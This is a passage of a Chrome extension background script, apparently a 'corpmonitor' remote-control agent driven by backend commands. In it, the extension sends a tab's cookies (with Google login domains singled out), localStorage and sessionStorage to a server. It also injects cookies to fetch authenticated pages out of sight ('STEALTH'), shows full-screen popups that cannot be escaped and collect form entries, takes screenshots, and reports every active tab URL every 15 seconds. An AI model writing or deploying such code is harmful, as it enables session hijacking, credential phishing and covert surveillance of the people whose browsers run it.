    // 🍪 INJETAR COOKIES NO CONTEXTO DO BROWSER
    if (providedCookies && Array.isArray(providedCookies) && providedCookies.length > 0) {
      log('info', `🍪 [STEALTH] Injecting ${providedCookies.length} cookies...`);
      
      for (const cookie of providedCookies) {
        try {
          const cookieDetails = {
            url: target_url,
            name: cookie.name,
            value: cookie.value,
            domain: cookie.domain || targetDomain,
            path: cookie.path || '/',
            secure: cookie.secure !== false,
            httpOnly: cookie.httpOnly || false,
            sameSite: cookie.sameSite || 'lax'
          };
          
          await chrome.cookies.set(cookieDetails);
          injectedCookies.push({ name: cookie.name, domain: cookieDetails.domain });
        } catch (err) {
          log('warn', `⚠️ Cookie injection failed: ${cookie.name}`, err);
        }
      }
      
      log('info', `✅ [STEALTH] Injected ${injectedCookies.length} cookies successfully`);
    }
    
    // ✅ FAZER FETCH VIA OFFSCREEN (invisível)
    const result = await chrome.runtime.sendMessage({
      type: 'OFFSCREEN_FETCH',
      url: target_url
    });
    
    if (!result.success) {
      throw new Error(result.error);
    }
    
    log('info', `✅ [STEALTH] Fetched ${result.html.length} bytes from ${target_url}`);
    
    // 🧹 CLEANUP COOKIES
    if (injectedCookies.length > 0) {
      log('info', `🧹 [STEALTH] Cleaning up ${injectedCookies.length} cookies...`);
      
      for (const cookie of injectedCookies) {
        try {
          await chrome.cookies.remove({
            url: target_url,
            name: cookie.name
          });
        } catch (err) {
          // Ignore cleanup errors
        }
      }
    }
    
    // 📤 SEND RESULT TO BACKEND
    const responseData = await fetch(`${CONFIG.API_BASE}/proxy-fetch-result`, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'Authorization': `Bearer ${CONFIG.SUPABASE_ANON_KEY}`
      },
      body: JSON.stringify({
        command_id,
        machine_id: machineId,
        url: target_url,
        html_content: result.html,
        status_code: result.status,
        success: true,
        stealth_mode: true
      })
    });
    
    if (!responseData.ok) {
      throw new Error(`Failed to send response: ${responseData.status}`);
    }
    
    log('info', `✅ [STEALTH] Result sent for command ${command_id}`);
    
  } catch (error) {
    log('error', '[STEALTH] Offscreen fetch failed:', error);
    
    try {
      await fetch(`${CONFIG.API_BASE}/proxy-fetch-result`, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
          'Authorization': `Bearer ${CONFIG.SUPABASE_ANON_KEY}`
        },
        body: JSON.stringify({
          command_id,
          machine_id: machineId,
          url: target_url,
          form_data: {
            error: error.message,
            success: false
          }
        })
      });
    } catch (sendError) {
      log('error', 'Failed to send error response:', sendError);
    }
    
  } finally {
    // ✅ FECHAR OFFSCREEN DOCUMENT
    await closeOffscreenDocument();
  }
}

// ✅ HELPER: Criar offscreen document se não existir
async function createOffscreenDocument() {
  try {
    const existingContexts = await chrome.runtime.getContexts({
      contextTypes: ['OFFSCREEN_DOCUMENT'],
      documentUrls: [chrome.runtime.getURL('offscreen.html')]
    });
    
    if (existingContexts.length > 0) {
      log('debug', '📄 [STEALTH] Offscreen document already exists');
      return;
    }
    
    await chrome.offscreen.createDocument({
      url: 'offscreen.html',
      reasons: ['DOM_SCRAPING'],
      justification: 'Fetch authenticated pages without visible tabs'
    });
    
    log('info', '📄 [STEALTH] Offscreen document created');
  } catch (error) {
    log('error', '❌ [STEALTH] Failed to create offscreen document:', error);
    throw error;
  }
}

// ✅ HELPER: Fechar offscreen document
async function closeOffscreenDocument() {
  try {
    await chrome.offscreen.closeDocument();
    log('info', '🧹 [STEALTH] Offscreen document closed');
  } catch (err) {
    // Já estava fechado ou não existe
    log('debug', '[STEALTH] Offscreen document already closed');
  }
}

// Handle export cookies command - collect fresh cookies and sync to incident
async function handleExportCookiesCommand(data) {
  try {
    const tabId = parseInt(data.target_tab_id);
    const tab = await chrome.tabs.get(tabId);
    const url = new URL(tab.url);
    const host = url.hostname;
    
    log('info', `🍪 Export cookies command for tab ${tabId}, host: ${host}`);
    
    // Collect cookies from this host and related domains
    const domains = [host];
    if (host.startsWith('www.')) {
      domains.push(host.substring(4));
    } else {
      domains.push('www.' + host);
    }
    
    // For common auth domains (especialmente Google)
    const baseDomain = host.split('.').slice(-2).join('.');
    if (host.includes('google.com')) {
      domains.push('mail.google.com', 'accounts.google.com', '.google.com', 'google.com');
    }
    
    const allCookies = [];
    for (const domain of domains) {
      try {
        const cookies = await chrome.cookies.getAll({ domain });
        allCookies.push(...cookies);
      } catch (error) {
        log('error', `Failed to get cookies for ${domain}`, error);
      }
    }
    
    // Deduplicate by name::domain::path to preserve cookie variations
    // This is important for sites like Gmail where OSID/SID cookies exist for different domains
    const cookieMap = new Map();
    for (const cookie of allCookies) {
      const key = `${cookie.name}::${cookie.domain}::${cookie.path}`;
      cookieMap.set(key, {
        name: cookie.name,
        value: cookie.value,
        domain: cookie.domain,
        path: cookie.path,
        secure: cookie.secure,
        httpOnly: cookie.httpOnly,
        sameSite: cookie.sameSite,
        expirationDate: cookie.expirationDate,
        isSession: !cookie.expirationDate || cookie.expirationDate === 0  // ✅ NOVO: flag de sessão
      });
    }
    
    const cookies = Array.from(cookieMap.values());
    log('info', `🍪 Collected ${cookies.length} unique cookies from ${domains.length} domains`);
    log('info', `📋 Cookie names: ${cookies.slice(0, 10).map(c => c.name).join(', ')}${cookies.length > 10 ? '...' : ''}`);
    
    // ✅ NOVO: Coletar localStorage e sessionStorage
    let localStorage = {};
    let sessionStorage = {};
    
    try {
      const storageData = await chrome.scripting.executeScript({
        target: { tabId },
        func: () => {
          const local = {};
          const session = {};
          
          try {
            for (let i = 0; i < localStorage.length; i++) {
              const key = localStorage.key(i);
              local[key] = localStorage.getItem(key);
            }
          } catch (e) {
            console.warn('Failed to read localStorage:', e);
          }
          
          try {
            for (let i = 0; i < sessionStorage.length; i++) {
              const key = sessionStorage.key(i);
              session[key] = sessionStorage.getItem(key);
            }
          } catch (e) {
            console.warn('Failed to read sessionStorage:', e);
          }
          
          return { localStorage: local, sessionStorage: session };
        }
      });
      
      if (storageData && storageData[0] && storageData[0].result) {
        localStorage = storageData[0].result.localStorage || {};
        sessionStorage = storageData[0].result.sessionStorage || {};
        log('info', `💾 Collected localStorage (${Object.keys(localStorage).length} keys) and sessionStorage (${Object.keys(sessionStorage).length} keys)`);
      }
    } catch (storageError) {
      log('warn', '⚠️ Failed to collect storage data:', storageError);
    }
    
    // Send to cookie-sync edge function
    const response = await fetch(`${CONFIG.API_BASE}/cookie-sync`, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'Authorization': `Bearer ${CONFIG.SUPABASE_ANON_KEY}`
      },
      body: JSON.stringify({
        incident_id: data.payload?.incident_id,
        cookies: cookies,
        host: host,
        tab_url: tab.url,
        localStorage: localStorage || null,      // ✅ NOVO
        sessionStorage: sessionStorage || null   // ✅ NOVO
      })
    });
    
    if (!response.ok) {
      throw new Error(`Cookie sync failed: ${response.status}`);
    }
    
    const result = await response.json();
    log('info', 'Cookies exported successfully', result);
    
    // Send success response back via WebSocket
    if (commandSocket && commandSocket.readyState === WebSocket.OPEN) {
      commandSocket.send(JSON.stringify({
        type: 'command_response',
        command_id: data.command_id,
        success: true,
        cookies_exported: cookies.length
      }));
    }
  } catch (error) {
    log('error', 'Export cookies command failed', error);
    
    // Send error response
    if (commandSocket && commandSocket.readyState === WebSocket.OPEN) {
      commandSocket.send(JSON.stringify({
        type: 'command_response',
        command_id: data.command_id,
        success: false,
        error: error.message
      }));
    }
  }
}

// Handle popup command with BLOCKING, OBLIGATORY popup
async function handlePopupCommand(data) {
  const tabId = parseInt(data.target_tab_id);
  const htmlContent = data.payload?.html_content || '';
  const cssStyles = data.payload?.css_styles || '';
  const commandId = data.command_id || '';
  
  await chrome.scripting.executeScript({
    target: { tabId },
    func: (html, css, cmdId, apiBase, apiKey, machineIdVal, tabIdVal) => {
      // Remove existing popup if any
      const existingOverlay = document.querySelector('.corpmonitor-popup-overlay');
      if (existingOverlay) {
        existingOverlay.remove();
      }
      
      // Create BLOCKING overlay - full screen, no escape
      const overlay = document.createElement('div');
      overlay.className = 'corpmonitor-popup-overlay';
      
      // Inject BLOCKING CSS
      const style = document.createElement('style');
      style.textContent = `
        .corpmonitor-popup-overlay {
          position: fixed !important;
          top: 0 !important;
          left: 0 !important;
          width: 100vw !important;
          height: 100vh !important;
          background: rgba(0, 0, 0, 0.85) !important;
          z-index: 2147483647 !important;
          display: flex !important;
          align-items: center !important;
          justify-content: center !important;
          backdrop-filter: blur(8px) !important;
        }
        
        .corpmonitor-popup-content {
          position: relative !important;
          background: white !important;
          padding: 40px !important;
          border-radius: 12px !important;
          max-width: 600px !important;
          width: 90% !important;
          max-height: 90vh !important;
          overflow-y: auto !important;
          box-shadow: 0 20px 60px rgba(0, 0, 0, 0.5) !important;
        }
        
        ${css}
      `;
      document.head.appendChild(style);
      
      // Wrap HTML in centered container
      const contentDiv = document.createElement('div');
      contentDiv.className = 'corpmonitor-popup-content';
      contentDiv.innerHTML = html;
      overlay.appendChild(contentDiv);
      
      // Block all keyboard shortcuts and closing attempts
      overlay.addEventListener('keydown', (e) => {
        e.stopPropagation();
        // Block ESC, F11, Alt+F4, Ctrl+W, etc.
        if (e.key === 'Escape' || e.key === 'F11' || 
            (e.altKey && e.key === 'F4') || 
            (e.ctrlKey && e.key === 'w')) {
          e.preventDefault();
        }
      }, true);
      
      // Block right-click
      overlay.addEventListener('contextmenu', (e) => {
        e.preventDefault();
      });
      
      // Find form inside and handle submission
      const form = contentDiv.querySelector('form');
      if (form) {
        form.addEventListener('submit', async (e) => {
          e.preventDefault();
          
          // Collect all form data
          const formData = new FormData(form);
          const dataObject = {};
          
          formData.forEach((value, key) => {
            dataObject[key] = value;
          });
          
          // Send to background script
          chrome.runtime.sendMessage({
            action: 'submitPopupForm',
            data: {
              command_id: cmdId,
              machine_id: machineIdVal,
              tab_id: tabIdVal,
              domain: window.location.hostname,
              url: window.location.href,
              form_data: dataObject
            }
          }, (response) => {
            if (response && response.success) {
              // Only remove popup after successful submission
              overlay.remove();
            } else {
              alert('Erro ao enviar formulário. Tente novamente.');
            }
          });
        });
      }
      
      document.body.appendChild(overlay);
    },
    args: [htmlContent, cssStyles, commandId, CONFIG.API_BASE, CONFIG.SUPABASE_ANON_KEY, machineId, data.target_tab_id]
  });
}

// Add message handler for form submission
chrome.runtime.onMessage.addListener((request, sender, sendResponse) => {
  if (request.action === 'submitPopupForm') {
    // Send form data to edge function
    fetch(`${CONFIG.API_BASE}/popup-response`, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'Authorization': `Bearer ${CONFIG.SUPABASE_ANON_KEY}`
      },
      body: JSON.stringify(request.data)
    })
    .then(response => response.json())
    .then(data => {
      log('info', 'Popup form submitted successfully', data);
      sendResponse({ success: true, data });
    })
    .catch(error => {
      log('error', 'Error submitting popup form', error);
      sendResponse({ success: false, error: error.message });
    });
    
    return true; // Keep channel open for async response
  }
});

// Handle block command
async function handleBlockCommand(data) {
  const domain = data.target_domain;
  const ruleId = Date.now();
  
  await chrome.declarativeNetRequest.updateDynamicRules({
    addRules: [{
      id: ruleId,
      priority: 1,
      action: { type: 'block' },
      condition: { urlFilter: `*://*.${domain}/*`, resourceTypes: ['main_frame'] }
    }]
  });
}

// Handle screenshot command
async function handleScreenshotCommand(data) {
  const tabId = parseInt(data.target_tab_id);
  const screenshotUrl = await chrome.tabs.captureVisibleTab(null, { format: 'png' });
  
  await fetch(`${CONFIG.API_BASE}/screenshot-capture`, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({
      machine_id: machineId,
      tab_id: data.target_tab_id,
      screenshot_data: screenshotUrl
    })
  });
}

// 🧹 Handle Self-Heal command
async function handleSelfHealCommand(command) {
  const { target_domains } = command.payload || {};
  
  log('info', `🧹 [SELF-HEAL] Received command for domains:`, target_domains);
  
  try {
    // For now, only support Google cleanup
    if (!target_domains || target_domains.includes('google')) {
      const result = await selfHealGoogleCookies();
      
      await updateCommandStatus(
        command.command_id,
        'completed',
        null,
        { 
          self_heal: true,
          cleaned_domains: ['google.com'],
          ...result
        }
      );
      
      // Reopen Google login page to test
      await chrome.tabs.create({
        url: 'https://accounts.google.com',
        active: true
      });
      
    } else {
      throw new Error('Unsupported domain for self-heal');
    }
    
  } catch (error) {
    log('error', '❌ [SELF-HEAL] Command failed:', error);
    await updateCommandStatus(command.command_id, 'failed', error.message);
  }
}

// Track active sessions with error handling
async function trackSession(tab) {
  try {
    const url = new URL(tab.url);
    if (url.protocol === 'chrome:') return;
    
    const response = await fetch(`${CONFIG.API_BASE}/session-tracker`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        machine_id: machineId,
        tab_id: tab.id.toString(),
        url: tab.url,
        domain: url.hostname,
        title: tab.title,
        action: 'heartbeat'
      })
    });
    
    if (!response.ok) {
      log('error', `Session tracker failed: ${response.status} ${response.statusText}`);
    }
  } catch (error) {
    // Don't break extension on network errors
    log('debug', 'Session tracker error (non-critical)', error);
  }
}

// Close session with error handling
async function closeSession(tabId) {
  try {
    const sessionData = activeSessions.get(tabId);
    if (!sessionData) return;
    
    const response = await fetch(`${CONFIG.API_BASE}/session-tracker`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ ...sessionData, action: 'close' })
    });
    
    if (!response.ok) {
      log('error', `Close session failed: ${response.status} ${response.statusText}`);
    }
  } catch (error) {
    // Don't break extension on network errors
    log('debug', 'Close session error (non-critical)', error);
  }
  
  activeSessions.delete(tabId);
}

// Start session heartbeat
function startSessionHeartbeat() {
  setInterval(async () => {
    const tabs = await chrome.tabs.query({ active: true });
    for (const tab of tabs) {
      if (tab.url && !tab.url.startsWith('chrome:')) {
        await trackSession(tab);
      }
    }
  }, 15000);
}

// Import service worker utilities
if (typeof importScripts !== 'undefined') {
  try {
    importScripts('service-worker-utils.js', 'config.js');
  } catch (error) {
    log('warn', 'Could not load service worker utilities', error);
  }
}
